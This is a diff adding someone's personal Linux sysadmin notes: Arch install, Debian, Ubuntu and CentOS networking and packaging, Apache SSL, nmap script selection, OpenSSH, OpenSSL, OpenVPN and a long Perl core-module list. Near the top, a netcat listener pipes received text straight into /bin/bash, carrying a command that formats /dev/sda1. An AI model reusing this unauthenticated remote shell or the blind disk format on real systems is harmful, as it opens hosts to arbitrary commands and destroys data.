+    echo "mkfs.ext4 /dev/sda1 && mount /dev/sda1 /mnt && pacstrap /mnt base && arch-chroot /mnt && for p in "emacs" "openssh"; do pacman -S --noconfirm $p; done && echo DONE && exit" | nc 10.0.1.111 8888
+    nc -lp 8888 | /bin/bash
+
+    Packages only:
+    echo "arch-chroot /mnt && for package in "openssh" "sudo"; do pacman -Sy --noconfirm $package; done && echo DONE && exit" | nc 10.0.1.111 8888
+
+** ARCH : netcfg
+/etc/conf.d/netcfg
+
+    Parameters for startup.
+/etc/network.d/
+
+    User-defined profiles.
+
+
+
+/usr/lib/network/connections/
+
+    Currently installed network profile types.
+/etc/network.d/examples/
+
+    Example profiles.
+/usr/share/doc/netcfg/contrib/
+
+    Inspirational scripts.
+
+** ARCH : pacman
+   pacman -Syy
+     Sync, refresh (Download a fresh copy of master package list defined in pacman.conf)
+   pacman -Syu
+     Sync, refresh, sysupgrade
+   pacman -Sui
+     Sync (aka install), update, show info
+
+** ARCH : show device name
+   ls /sys/class/net
+
+** ARCH : systemctl
+   systemctl enable sshd
+   systemctl enable sshd.service
+
+* LINUX : DEBIAN
+** Static IP
+   # Configure a static IP in debian
+
+   #The loopback interface
+   auto lo
+   iface lo inet loopback
+   auto eth0
+   iface eth0 inet static
+   #your static IP
+   address 192.168.1.118
+   #your gateway IP
+   gateway 192.168.1.1
+   netmask 255.255.255.0
+   #your network address "family"
+   network 192.168.1.0
+   broadcast 192.168.1.255
+
+** Force remove/purge package
+   # dpkg --force-all -P <package>
+   # dpkg --force-all -r <package>
+
+** dpkg-scanpackages /deb/path | gzip -9c > Packages.gz
+
+* LINUX : UBUNTU
+** COMMAND : add-apt-repository
+   # Add repository
+   add-apt-repository --enable-source "deb file:///skylab/repos /"
+
+** COMMAND : apt-key
+   # Add/remove trusted repository GPG keys
+
+   apt-key add <public-key>
+   apt-key del <key-id>
+
+** COMMAND : apt-get
+   # apt-get install --reinstall package
+
+** COMMAND : dpkg
+   # dpkg -i package
+   # dpkg --force-all --purge package
+   # dpkg --remove package
+   # dpkg --info package
+   Show information about a package
+   # dpkg --contents package
+   List contents of a deb package
+
+** COMMAND : update-manager
+   # Graphical management of software packages updates
+
+** Installing GNOME desktop environment
+   ubuntu-gnome-desktop
+   # will install a full GNOME desktop environment (including gnome-shell), along with a few standard applications and optimizations for Ubuntu
+   # Depends on gnome-shell gnome-shell-extensions
+
+   gnome-shell
+   # will only install the GNOME shell, and its dependencies
+
+   gnome-session-fallback
+   # is the absolute minimum GNOME desktop you can install
+
+** set hostname
+   /etc/hostname
+
+** missing htpasswd
+   # apt-get install apache2-utils
+
+** enable apache2 cgi-bin
+   # a2enmod cgi
+
+** enable apache2 rewrite
+   # a2enmod rewrite
+
+** SSL Certificate for Apache2
+# a2enmod ssl
+   enable module
+
+# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/apache2/ssl/apache.key -out /etc/apache2/ssl/apache.crt
+
+
+    -openssl: This is the basic command line tool provided by OpenSSL to create and manage certificates, keys, signing requests, etc.
+    -req: This specifies a subcommand for X.509 certificate signing request (CSR) management. X.509 is a public key infrastructure standard that SSL adheres to for its key and certificate managment. Since we are wanting to create a new X.509 certificate, this is what we want.
+    -x509: This option specifies that we want to make a self-signed certificate file instead of generating a certificate request.
+    -nodes: This option tells OpenSSL that we do not wish to secure our key file with a passphrase. Having a password protected key file would get in the way of Apache starting automatically as we would have to enter the password every time the service restarts.
+    -days 365: This specifies that the certificate we are creating will be valid for one year.
+    -newkey rsa:2048: This option will create the certificate request and a new private key at the same time. This is necessary since we didn't create a private key in advance. The rsa:2048 tells OpenSSL to generate an RSA key that is 2048 bits long.
+    -keyout: This parameter names the output file for the private key file that is being created.
+    -out: This option names the output file for the certificate that we are generating.
+
+
+# vi /etc/apache2/sites-available/default-ssl.conf
+SSLCertificateFile /etc/apache2/ssl/apache.crt
+SSLCertificateKeyFile /etc/apache2/ssl/apache.key
+
+# a2ensite default-ssl.conf
+  Enable SSL-enabled virtual host
+
+# service apache2 restart
+
+** Installing development tools
+   aptitude -y install gcc binutils make linux-source
+
+** deb repository
+   deb deb file:/home/user/repository
+   dpkg-scanpackages --multiversion ./ | gzip -9c > Packages.gz
+   dpkg-scansources ./ | gzip -9c > Sources.gz
+
+*** Sign debs
+    # Don't need to do this as packages are not verified by default
+
+    dpkg-sig -k keyid --sign builder your_packages_$VERSION_$ARCHITECTURE.deb
+    dpkg-sig -k BE289760 --sign bulder xul-ext-ubufox_3.0-0ubuntu0.14.10.1_all.deb
+
+    gpg --verify xserver-xorg-video-intel_2%3a2.99.914-1~exp1ubuntu4.2_amd64.deb
+
+*** Remove deb signature
+    ar d "$yourpackage.deb" _gpgbuilder
+
+    This works because .deb files, at the outermost layer, are essentially just "ar" archives, and embedded deb sigs are stored in that outermost layer. There is a small difference between .debs created with dpkg and those created with ar, so normally it's a good idea to stick to real dpkg tools when manipulating deb files, but all modern tools (afaik) can handle both just fine.
+
+** Nagios install-webconf
+   # /usr/bin/install -c -m 644 sample-config/httpd.conf /etc/apache2/sites-enabled/nagios.conf
+
+** static interface
+/etc/network/interfaces
+
+auto lo eth0
+iface lo inet loopback
+iface eth0 inet static
+        address xxx.xxx.xxx.xxx
+        netmask xxx.xxx.xxx.xxx
+        gateway xxx.xxx.xxx.xxx
+
+* LINUX : CENTOS
+** Remote timezone
+   # /etc/localtime
+   # ln -s /usr/share/zoneinfo/America/New_York /etc/localtime
+
+** /etc/sysconfig/network-scripts/ifcfg-enp0s17
+TYPE="Ethernet"
+BOOTPROTO="none"
+DEFROUTE="yes"
+IPV4_FAILURE_FATAL="yes"
+IPV6INIT="no"
+IPV6_AUTOCONF="yes"
+IPV6_DEFROUTE="yes"
+IPV6_PEERDNS="yes"
+IPV6_PEERROUTES="yes"
+IPV6_FAILURE_FATAL="no"
+NAME="enp0s17"
+UUID="e23fed8e-a0c7-444d-af23-df6ee6302b11"
+ONBOOT="yes"
+HWADDR="08:00:27:52:72:4F"
+IPADDR0="10.0.1.23"
+PREFIX0="23"
+GATEWAY0="10.0.1.1"
+DNS1="10.0.1.1"
+
+** iptables managed by firewalld
+   yum install iptables-services
+   systemctl mask firewalld.service
+   systemctl enable iptables.service
+   systemctl enable ip6tables.service
+
+   systemctl stop firewalld.service
+   systemctl start iptables.service
+   systemctl start ip6tables.service
+
+* LINUX : OPENSUSE
+** Changing resolution
+   cvt 1920 1200
+   ## 1920x1200 59.88 Hz (CVT 2.30MA) hsync: 74.56 kHz; pclk: 193.25 MHz
+   #Modeline "1920x1200_60.00"  193.25  1920 2056 2256 2592  1200 1203 1209 1245 -hsync +vsync
+
+   xrandr --newmode "1920x1200_60.00"  193.25  1920 2056 2256 2592  1200 1203 1209 1245 -hsync +vsync
+   xrandr --addmode HDMI2 1920x1200_60.00
+   xrandr --output HDMI2 --mode 1920x1200_60.00
+** COMMAND : xrandr
+   xrandr --q1
+
+** createrepo <directory>
+
+** Prevent Lid Close Suspension
+   /etc/systemd/logind.conf
+
+   default: HandleLidSwitch=suspend
+   update: HandleLidSwitch=ignore
+   systemctl restart systemd-logind
+
+** zypper --pkg-cache-dir ./ download <package>
+
+** zypper info --requires -repo local_repo createrepo
+
+** zypper install -y --repo local_repo emacs
+
+** Xfce Ctrl to Caps
+   /usr/bin/setxkbmap -option "ctrl:nocaps"
+
+* mRemoteNG
+  # Filezilla integration
+  sftp://%Username%:%Password%@%Hostname%:%Port%
+
+* Networking : /proc/net/ip_conntrack
+  See the sockets
+
+* nmap
+  -Pn					# disable ping
+  -n					# never do reverse DNS
+  -sn					# ping only
+  --dns-servers <server1>,<server2>	# custom DNS
+  -R					# always do reverse DNS
+  -oX					# output XML
+
+  # Extended scripts
+  –script <script>
+  	smb-os-discovery.nse 		# Windows hostname discovery
+
+nmap --script "http-*"
+
+    Loads all scripts whose name starts with http-, such as http-auth and http-open-proxy. The argument to --script had to be in quotes to protect the wildcard from the shell.
+
+More complicated script selection can be done using the and, or, and not operators to build Boolean expressions. The operators have the same precedence as in Lua: not is the highest, followed by and and then or. You can alter precedence by using parentheses. Because expressions contain space characters it is necessary to quote them.
+
+nmap --script "not intrusive"
+    Loads every script except for those in the intrusive category.
+
+nmap --script "default or safe"
+    This is functionally equivalent to nmap --script "default,safe". It loads all scripts that are in the default category or the safe category or both.
+
+nmap --script "default and safe"
+    Loads those scripts that are in both the default and safe categories.
+
+nmap --script "(default or safe or intrusive) and not http-*"
+    Loads scripts in the default, safe, or intrusive categories, except for those whose names start with http-.
+
+* OpenSSH
+  PermitRootLogin no	# disallow root account login
+
+  ssh root@MachineB 'bash -s' < LOCALFILE		# run a script over SSH
+  ssh HOST cat < LOCALFILE ">" REMOTEFILE
+  ssh HOST "cat < REMOTEFILE" > LOCALFILE
+
+** Regenerate Server Host Keys
+   rm -v /etc/ssh/ssh_host_*
+   dpkg-reconfigure openssh-server
+
+** Remove host fingerprint
+   ssh-keygen -R <remote-server-name>
+
+* OpenSSL
+  PEM certificates usually have extentions such as .pem, .crt, .cer, and .key
+  They are Base64 encoded ASCII files and contain "-----BEGIN CERTIFICATE-----" and "-----END CERTIFICATE-----" statements. Server certificates, intermediate certificates, and private keys can all be put into the PEM format.
+
+  DER format is simply a binary form of a certificate instead of the ASCII PEM format. It sometimes has a file extension of .der but it often has a file extension of .cer so the only way to tell the difference between a DER .cer file and a PEM .cer file is to open it in a text editor and look for the BEGIN/END statements.
+
+
+  # system-wide certificate directory
+  /etc/ssl/certs
+
+
+  # Verify certificates
+  openssl verify [-CApath directory] [-CAfile file] [-purpose purpose] [-untrusted file] [-help] [-issuer_checks] [-verbose] [-] [certificates]
+
+  # Print certificate information
+  openssl x509 -inform DIR -in certificat.cer -text -noout
+  openssl pkcs7 -inform DER -outform PEM -print_certs -in dodeca2.cac -text -noout
+
+	-serial
+	-fingerprint
+
+** PEM Formats
+The PEM private key format uses the header and footer lines:
+
+ -----BEGIN RSA PRIVATE KEY-----
+ -----END RSA PRIVATE KEY-----
+
+The PEM public key format uses the header and footer lines:
+
+ -----BEGIN PUBLIC KEY-----
+ -----END PUBLIC KEY-----
+
+The PEM RSAPublicKey format uses the header and footer lines:
+
+ -----BEGIN RSA PUBLIC KEY-----
+ -----END RSA PUBLIC KEY-----
+
+** Conversions
+   # Convert a DER file (.crt .cer .der) to PEM
+   openssl x509 -inform der -in certificate.cer -out certificate.pem
+
+   # Convert a PEM file to DER
+   openssl x509 -outform der -in certificate.pem -out certificate.der
+
+   # Convert a PKCS#12 file (.pfx .p12) containing a private key and certificates to PEM
+   openssl pkcs12 -in keyStore.pfx -out keyStore.pem -nodes
+   • You can add -nocerts to only output the private key or add -nokeys to only output the certificates.
+
+   # Convert a PEM certificate file and a private key to PKCS#12 (.pfx .p12)
+   openssl pkcs12 -export -out certificate.pfx -inkey privateKey.key -in certificate.crt -certfile CACert.crt
+
+** Convert DoD Certificates to PEM format
+   openssl pkcs7 -inform DER -outform PEM -print_certs -in dodeca.cac -out dodeca.pem
+   openssl pkcs7 -inform DER -outform PEM -print_certs -in dodeca2.cac -out dodeca2.pem
+   openssl pkcs7 -inform DER -outform PEM -print_certs -in rel3_dodroot_2048.cac -out rel3_dodroot_2048.pem
+
+** Get md5 hash
+   openssl md5 /path/to/file
+
+* OpenVPN
+
+
+  | Filename    | Needed By                | Purpose                   | Secret |
+  |-------------+--------------------------+---------------------------+--------|
+  | client1.crt | client1 only             | Client1 Certificate       | NO     |
+  | client1.key | client1 only             | Client1 Key               | YES    |
+  | client2.crt | client2 only             | Client2 Certificate       | NO     |
+  | client2.key | client2 only             | Client2 Key               | YES    |
+  | client3.crt | client3 only             | Client3 Certificate       | NO     |
+  | client3.key | client3 only             | Client3 Key               | YES    |
+  | ca.key      | key signing machine only | Root CA key               | YES    |
+  | ca.crt      | server + all clients     | Root CA certificate       | NO     |
+  | dh{n}.pem   | server only              | Diffie Hellman parameters | NO     |
+  | server.crt  | server only              | Server Certificate        | NO     |
+  | server.key  | server only              | Server Key                | YES    |
+
+
+  # OpenSSL CA Steps
+
+  ## Server
+  openssl genrsa -out rootCA.key 4096
+  openssl genrsa -out rootCA.key 4096 -des3
+  openssl req -x509 -new -nodes -key rootCA.key -days 1024 -out rootCA.pem
+
+  ## Client
+  openssl genrsa -out device.key 4096
+  openssl req -new -key device.key -out device.csr
+  Common Name (eg, YOUR name) []: 10.0.0.1
+  openssl x509 -req -in device.csr -CA root.pem -CAkey root.key -CAcreateserial -out device.crt -days 500
+
+
+  # OpenVPN Steps
+  https://www.tinfoilsecurity.com/blog/tags/vpn
+
+  openssl req -newkey rsa:4096 -keyout /etc/openvpn/vpn-key.pem -out vpn.csr
+  openssl x509 -CA cacert.pem -CAkey cakey.pem -CAcreateserial -days 730 -req -in vpn.csr -out vpn-cert.pem
+  openvpn --genkey --secret /etc/openvpn/ta.key		# shared key to put on server and client
+  openssl dhparam -out /etc/openvpn/dh4096.pem 4096
+
+
+  sysctl -w net.ipv4.ip_forward=1
+  uncomment the line in /etc/sysctl.conf to persist this across restarts
+
+  iptables -I FORWARD -i tun0 -o eth0 -s 10.8.0.0/24 -m conntrack --ctstate NEW -j ACCEPT
+  iptables -I FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+  iptables -t nat -I POSTROUTING -o eth0 -s 10.8.0.0/24 -j MASQUERADE
+
+  ## A TAP device is a virtual ethernet adapter, while a TUN device is a virtual point-to-point IP link.
+
+** client.ovpn inline certificate
+client
+
+dev tun
+proto tcp
+remote 1.2.3.4 1194
+
+resolv-retry infinite
+nobind
+
+persist-key
+persist-tun
+
+ca [inline]
+cert [inline]
+key [inline]
+
+verb 1
+
+keepalive 10 900
+inactive 3600
+comp-lzo
+
+<ca>
+-----BEGIN CERTIFICATE-----
+...
+-----END CERTIFICATE-----
+</ca>
+<cert>
+-----BEGIN CERTIFICATE-----
+...
+-----END CERTIFICATE-----
+</cert>
+<key>
+-----BEGIN RSA PRIVATE KEY-----
+...
+-----END RSA PRIVATE KEY-----
+</key>
+
+* PERL
+  # one-liner
+  /usr/bin/perl -MTime::Piece -le 'my $time = localtime->ymd; print "$time\n";'
+
+** Variable : Scalars
+   use strict;
+   my $variable = "string";
+   my $int = 42;
+
+   print "The square of $answer is ", $int * $int, "\n";
+
+** Variable : Arrays
+   use strict;
+   my @mixedarray = ("camel", 42, 1.23);
+   my @sorted = sort @animals;
+   my @backwards = reverse @numbers;
+
+   @ARGV	# the command line arguments to your script
+   @_		# the arguments passed to a subroutine
+
+
+   print $array[0];
+
+   # last element of the aray
+   print $array[$#];
+
+   # array slice
+   # multiple values from array
+   @array[0,1];
+   @array[0..2];
+   @array[1..$#array];
+
+** Variable : Hashes
+   # A hash represents a set of key/value pairs
+   my @fruits = key %fruit_colors;
+   my @colors = values %fruit_colors;
+
+
+   my %fruit_color = ("apple", "red", "banana", "yellow");
+
+   # same
+
+   my %fruit_color = (
+   	apple => "red",
+	banana => "yellow",
+   );
+
+   # to get a hash element
+   $fruit_color{"apple"};	# gives "red"
+
+   # you can get
+
+** Function : qw
+   # quote word
+   use File::Temp qw(tempfile tempdir);
+
+   my @names = ('bob', 'rich', 'jen');
+   my @names = qw(bob rich jen);
+
+** CORE Modules
+
+    AnyDBM_File - provide framework for multiple DBMs
+    App::Prove - Implements the prove command.
+    App::Prove::State - State storage for the prove command.
+    App::Prove::State::Result - Individual test suite results.
+    App::Prove::State::Result::Test - Individual test results.
+    Archive::Extract - A generic archive extracting mechanism
+    Archive::Tar - module for manipulations of tar archives
+    Archive::Tar::File - a subclass for in-memory extracted file from Archive::Tar
+    Attribute::Handlers - Simpler definition of attribute handlers
+    AutoLoader - load subroutines only on demand
+    AutoSplit - split a package for autoloading
+
+    B - The Perl Compiler Backend
+    B::Concise - Walk Perl syntax tree, printing concise info about ops
+    B::Debug - Walk Perl syntax tree, printing debug info about ops
+    B::Deparse - Perl compiler backend to produce perl code
+    B::Lint - Perl lint
+    B::Lint::Debug - Adds debugging stringification to B::
+    B::Showlex - Show lexical variables used in functions or files
+    B::Terse - Walk Perl syntax tree, printing terse info about ops
+    B::Xref - Generates cross reference reports for Perl programs
+    Benchmark - benchmark running times of Perl code
+
+    Carp - alternative warn and die for modules
+    CGI - Handle Common Gateway Interface requests and responses
+    CGI::Apache - Backward compatibility module for CGI.pm
+    CGI::Carp - CGI routines for writing to the HTTPD (or other) error log
+    CGI::Cookie - Interface to HTTP Cookies
+    CGI::Fast - CGI Interface for Fast CGI
+    CGI::Pretty - module to produce nicely formatted HTML code
+    CGI::Push - Simple Interface to Server Push
+    CGI::Switch - Backward compatibility module for defunct CGI::Switch
+    CGI::Util - Internal utilities used by CGI module
+    Class::Struct - declare struct-like datatypes as Perl classes
+    Compress::Raw::Bzip2 - Low-Level Interface to bzip2 compression library
+    Compress::Raw::Zlib - Low-Level Interface to zlib compression library
+    Compress::Zlib - Interface to zlib compression library
+    Config - access Perl configuration information
+    Config::Extensions - hash lookup of which core extensions were built.
+    CPAN - query, download and build perl modules from CPAN sites
+    CPAN::Debug - internal debugging for CPAN.pm
+    CPAN::Distroprefs - read and match distroprefs
+    CPAN::FirstTime - Utility for CPAN::Config file Initialization
+    CPAN::HandleConfig - internal configuration handling for CPAN.pm
+    CPAN::Kwalify - Interface between CPAN.pm and Kwalify.pm
+    CPAN::Nox - Wrapper around CPAN.pm without using any XS module
+    CPAN::Queue - internal queue support for CPAN.pm
+    CPAN::Tarzip - internal handling of tar archives for CPAN.pm
+    CPAN::Version - utility functions to compare CPAN versions
+    CPANPLUS - API & CLI access to the CPAN mirrors
+    CPANPLUS::Backend - programmer's interface to CPANPLUS
+    CPANPLUS::Backend::RV - return value objects
+    CPANPLUS::Config - configuration defaults and heuristics for CPANPLUS
+    CPANPLUS::Configure - configuration for CPANPLUS
+    CPANPLUS::Dist - base class for plugins
+    CPANPLUS::Dist::Autobundle - distribution class for installation snapshots
+    CPANPLUS::Dist::Base - Base class for custom distribution classes
+    CPANPLUS::Dist::Build - CPANPLUS plugin to install packages that use Build.PL
+    CPANPLUS::Dist::Build::Constants - Constants for CPANPLUS::Dist::Build
+    CPANPLUS::Dist::MM - distribution class for MakeMaker related modules
+    CPANPLUS::Dist::Sample - Sample code to create your own Dist::* plugin
+    CPANPLUS::Error - error handling for CPANPLUS
+    CPANPLUS::Internals - CPANPLUS internals
+    CPANPLUS::Internals::Extract - internals for archive extraction
+    CPANPLUS::Internals::Fetch - internals for fetching files
+    CPANPLUS::Internals::Report - internals for sending test reports
+    CPANPLUS::Internals::Search - internals for searching for modules
+    CPANPLUS::Internals::Source - internals for updating source files
+    CPANPLUS::Internals::Source::Memory - In memory implementation
+    CPANPLUS::Internals::Source::SQLite - SQLite implementation
+    CPANPLUS::Internals::Utils - convenience functions for CPANPLUS
+    CPANPLUS::Module - CPAN module objects for CPANPLUS
+    CPANPLUS::Module::Author - CPAN author object for CPANPLUS
+    CPANPLUS::Module::Author::Fake - dummy author object for CPANPLUS
+    CPANPLUS::Module::Checksums - checking the checksum of a distribution
+    CPANPLUS::Module::Fake - fake module object for internal use
+    CPANPLUS::Selfupdate - self-updating for CPANPLUS
+    CPANPLUS::Shell - base class for CPANPLUS shells
+    CPANPLUS::Shell::Classic - CPAN.pm emulation for CPANPLUS
+    CPANPLUS::Shell::Default - the default CPANPLUS shell
+    CPANPLUS::Shell::Default::Plugins::CustomSource - add custom sources to CPANPLUS
+    CPANPLUS::Shell::Default::Plugins::Remote - connect to a remote CPANPLUS
+    CPANPLUS::Shell::Default::Plugins::Source - read in CPANPLUS commands
+    Cwd - get pathname of current working directory
+
+    Data::Dumper - stringified perl data structures, suitable for both printing and eval
+    DB - programmatic interface to the Perl debugging API
+    DBM_Filter - Filter DBM keys/values
+    DBM_Filter::compress - filter for DBM_Filter
+    DBM_Filter::encode - filter for DBM_Filter
+    DBM_Filter::int32 - filter for DBM_Filter
+    DBM_Filter::null - filter for DBM_Filter
+    DBM_Filter::utf8 - filter for DBM_Filter
+    DB_File - Perl5 access to Berkeley DB version 1.x
+    Devel::InnerPackage - find all the inner packages of a package
+    Devel::Peek - A data debugging tool for the XS programmer
+    Devel::PPPort - Perl/Pollution/Portability
+    Devel::SelfStubber - generate stubs for a SelfLoading module
+    Digest - Modules that calculate message digests
+    Digest::base - Digest base class
+    Digest::file - Calculate digests of files
+    Digest::MD5 - Perl interface to the MD5 Algorithm
+    Digest::SHA - Perl extension for SHA-1/224/256/384/512
+    DirHandle - supply object methods for directory handles
+    Dumpvalue - provides screen dump of Perl data.
+    DynaLoader - Dynamically load C libraries into Perl code
+
+    Encode - character encodings in Perl
+    Encode::Alias - alias definitions to encodings
+    Encode::Byte - Single Byte Encodings
+    Encode::CJKConstants - Internally used by Encode::??::ISO_2022_*
+    Encode::CN - China-based Chinese Encodings
+    Encode::CN::HZ - internally used by Encode::CN
+    Encode::Config - internally used by Encode
+    Encode::EBCDIC - EBCDIC Encodings
+    Encode::Encoder - Object Oriented Encoder
+    Encode::Encoding - Encode Implementation Base Class
+    Encode::GSM0338 - ESTI GSM 03.38 Encoding
+    Encode::Guess - Guesses encoding from data
+    Encode::JP - Japanese Encodings
+    Encode::JP::H2Z - internally used by Encode::JP::2022_JP*
+    Encode::JP::JIS7 - internally used by Encode::JP
+    Encode::KR - Korean Encodings
+    Encode::KR::2022_KR - internally used by Encode::KR
+    Encode::MIME::Header - MIME 'B' and 'Q' header encoding
+    Encode::MIME::Name - internally used by Encode
+    Encode::Symbol - Symbol Encodings
+    Encode::TW - Taiwan-based Chinese Encodings
+    Encode::Unicode - Various Unicode Transformation Formats
+    Encode::Unicode::UTF7 - UTF-7 encoding
+    English - use nice English (or awk) names for ugly punctuation variables
+    Env - perl module that imports environment variables as scalars or arrays
+    Errno - System errno constants
+    Exporter - Implements default import method for modules
+    Exporter::Heavy - Exporter guts
+    ExtUtils::CBuilder - Compile and link C code for Perl modules
+    ExtUtils::CBuilder::Platform::Windows - Builder class for Windows platforms
+    ExtUtils::Command - utilities to replace common UNIX commands in Makefiles etc.
+    ExtUtils::Command::MM - Commands for the MM's to use in Makefiles
+    ExtUtils::Constant - generate XS code to import C header constants
+    ExtUtils::Constant::Base - base class for ExtUtils::Constant objects
+    ExtUtils::Constant::Utils - helper functions for ExtUtils::Constant
+    ExtUtils::Constant::XS - generate C code for XS modules' constants.
+    ExtUtils::Embed - Utilities for embedding Perl in C/C++ applications
+    ExtUtils::Install - install files from here to there
+    ExtUtils::Installed - Inventory management of installed modules
+    ExtUtils::Liblist - determine libraries to use and how to use them
+    ExtUtils::MakeMaker - Create a module Makefile
+    ExtUtils::MakeMaker::Config - Wrapper around Config.pm
+    ExtUtils::MakeMaker::FAQ - Frequently Asked Questions About MakeMaker
+    ExtUtils::MakeMaker::Tutorial - Writing a module with MakeMaker
+    ExtUtils::Manifest - utilities to write and check a MANIFEST file
+    ExtUtils::Miniperl - write the C code for perlmain.c
+    ExtUtils::Mkbootstrap - make a bootstrap file for use by DynaLoader
+    ExtUtils::Mksymlists - write linker options files for dynamic extension
+    ExtUtils::MM - OS adjusted ExtUtils::MakeMaker subclass
+    ExtUtils::MM_AIX - AIX specific subclass of ExtUtils::MM_Unix
+    ExtUtils::MM_Any - Platform-agnostic MM methods
+    ExtUtils::MM_BeOS - methods to override UN*X behaviour in ExtUtils::MakeMaker
+    ExtUtils::MM_Cygwin - methods to override UN*X behaviour in ExtUtils::MakeMaker
+    ExtUtils::MM_Darwin - special behaviors for OS X
+    ExtUtils::MM_DOS - DOS specific subclass of ExtUtils::MM_Unix
+    ExtUtils::MM_MacOS - once produced Makefiles for MacOS Classic
+    ExtUtils::MM_NW5 - methods to override UN*X behaviour in ExtUtils::MakeMaker
+    ExtUtils::MM_OS2 - methods to override UN*X behaviour in ExtUtils::MakeMaker
+    ExtUtils::MM_QNX - QNX specific subclass of ExtUtils::MM_Unix
+    ExtUtils::MM_Unix - methods used by ExtUtils::MakeMaker
+    ExtUtils::MM_UWIN - U/WIN specific subclass of ExtUtils::MM_Unix
+    ExtUtils::MM_VMS - methods to override UN*X behaviour in ExtUtils::MakeMaker
+    ExtUtils::MM_VOS - VOS specific subclass of ExtUtils::MM_Unix
+    ExtUtils::MM_Win32 - methods to override UN*X behaviour in ExtUtils::MakeMaker
+    ExtUtils::MM_Win95 - method to customize MakeMaker for Win9X
+    ExtUtils::MY - ExtUtils::MakeMaker subclass for customization
+    ExtUtils::Packlist - manage .packlist files
+    ExtUtils::ParseXS - converts Perl XS code into C code
+    ExtUtils::testlib - add blib/* directories to @INC
+
+    Fatal - Replace functions with equivalents which succeed or die
+    Fcntl - load the C Fcntl.h defines
+    File::Basename - Parse file paths into directory, filename and suffix.
+    File::CheckTree - run many filetest checks on a tree
+    File::Compare - Compare files or filehandles
+    File::Copy - Copy files or filehandles
+    File::DosGlob - DOS like globbing and then some
+    File::Fetch - A generic file fetching mechanism
+    File::Find - Traverse a directory tree.
+    File::Glob - Perl extension for BSD glob routine
+    File::GlobMapper - Extend File Glob to Allow Input and Output Files
+    File::Path - Create or remove directory trees
+    File::Spec - portably perform operations on file names
+    File::Spec::Cygwin - methods for Cygwin file specs
+    File::Spec::Epoc - methods for Epoc file specs
+    File::Spec::Functions - portably perform operations on file names
+    File::Spec::Mac - File::Spec for Mac OS (Classic)
+    File::Spec::OS2 - methods for OS/2 file specs
+    File::Spec::Unix - File::Spec for Unix, base for other File::Spec modules
+    File::Spec::VMS - methods for VMS file specs
+    File::Spec::Win32 - methods for Win32 file specs
+    File::stat - by-name interface to Perl's built-in stat() functions
+    File::Temp - return name and handle of a temporary file safely
+    FileCache - keep more files open than the system permits
+    FileHandle - supply object methods for filehandles
+    Filter::Simple - Simplified source filtering
+    Filter::Util::Call - Perl Source Filter Utility Module
+    FindBin - Locate directory of original perl script
+
+    Getopt::Long - Extended processing of command line options
+    Getopt::Std - Process single-character switches with switch clustering
+
+    Hash::Util - A selection of general-utility hash subroutines
+    Hash::Util::FieldHash - Support for Inside-Out Classes
+
+    I18N::Collate - compare 8-bit scalar data according to the current locale
+    I18N::Langinfo - query locale information
+    I18N::LangTags - functions for dealing with RFC3066-style language tags
+    I18N::LangTags::Detect - detect the user's language preferences
+    I18N::LangTags::List - tags and names for human languages
+    IO - load various IO modules
+    IO::Compress::Base - Base Class for IO::Compress modules
+    IO::Compress::Bzip2 - Write bzip2 files/buffers
+    IO::Compress::Deflate - Write RFC 1950 files/buffers
+    IO::Compress::Gzip - Write RFC 1952 files/buffers
+    IO::Compress::RawDeflate - Write RFC 1951 files/buffers
+    IO::Compress::Zip - Write zip files/buffers
+    IO::Dir - supply object methods for directory handles
+    IO::File - supply object methods for filehandles
+    IO::Handle - supply object methods for I/O handles
+    IO::Pipe - supply object methods for pipes
+    IO::Poll - Object interface to system poll call
+    IO::Seekable - supply seek based methods for I/O objects
+    IO::Select - OO interface to the select system call
+    IO::Socket - Object interface to socket communications
+    IO::Socket::INET - Object interface for AF_INET domain sockets
+    IO::Socket::UNIX - Object interface for AF_UNIX domain sockets
+    IO::Uncompress::AnyInflate - Uncompress zlib-based (zip, gzip) file/buffer
+    IO::Uncompress::AnyUncompress - Uncompress gzip, zip, bzip2 or lzop file/buffer
+    IO::Uncompress::Base - Base Class for IO::Uncompress modules
+    IO::Uncompress::Bunzip2 - Read bzip2 files/buffers
+    IO::Uncompress::Gunzip - Read RFC 1952 files/buffers
+    IO::Uncompress::Inflate - Read RFC 1950 files/buffers
+    IO::Uncompress::RawInflate - Read RFC 1951 files/buffers
+    IO::Uncompress::Unzip - Read zip files/buffers
+    IO::Zlib - IO:: style interface to Compress::Zlib
+    IPC::Cmd - finding and running system commands made easy
+    IPC::Msg - SysV Msg IPC object class
+    IPC::Open2 - open a process for both reading and writing using open2()
+    IPC::Open3 - open a process for reading, writing, and error handling using open3()
+    IPC::Semaphore - SysV Semaphore IPC object class
+    IPC::SharedMem - SysV Shared Memory IPC object class
+    IPC::SysV - System V IPC constants and system calls
+
+    List::Util - A selection of general-utility list subroutines
+    List::Util::XS - Indicate if List::Util was compiled with a C compiler
+    Locale::Country - standard codes for country identification
+    Locale::Currency - standard codes for currency identification
+    Locale::Language - standard codes for language identification
+    Locale::Maketext - framework for localization
+    Locale::Maketext::Guts - Deprecated module to load Locale::Maketext utf8 code
+    Locale::Maketext::GutsLoader - Deprecated module to load Locale::Maketext utf8 code
+    Locale::Maketext::Simple - Simple interface to Locale::Maketext::Lexicon
+    Locale::Script - standard codes for script identification
+    Log::Message - A generic message storing mechanism;
+    Log::Message::Config - Configuration options for Log::Message
+    Log::Message::Handlers - Message handlers for Log::Message
+    Log::Message::Item - Message objects for Log::Message
+    Log::Message::Simple - Simplified interface to Log::Message
+
+    Module::Build::Platform::darwin - Builder class for Mac OS X platform
+    Module::Build::Platform::Default - Stub class for unknown platforms
+    Module::Build::Platform::EBCDIC - Builder class for EBCDIC platforms
+    Module::Build::Platform::MacOS - Builder class for MacOS platforms
+    Module::Build::Platform::MPEiX - Builder class for MPEiX platforms
+    Module::Build::Platform::os2 - Builder class for OS/2 platform
+    Module::Build::Platform::RiscOS - Builder class for RiscOS platforms
+    Module::Build::Platform::Unix - Builder class for Unix platforms
+    Module::Build::Platform::VMS - Builder class for VMS platforms
+    Module::Build::Platform::VOS - Builder class for VOS platforms
+    Module::Build::Platform::Windows - Builder class for Windows platforms
+    Module::Build::PPMMaker - Perl Package Manager file creation
+    Module::Build::Version - DEPRECATED
+    Module::Build::YAML - DEPRECATED
+    Module::CoreList - what modules shipped with versions of perl
+    Module::Load - runtime require of both modules and files
+    Module::Load::Conditional - Looking up module information / loading at runtime
+    Module::Loaded - mark modules as loaded or unloaded
+    Module::Pluggable - automatically give your module the ability to have plugins
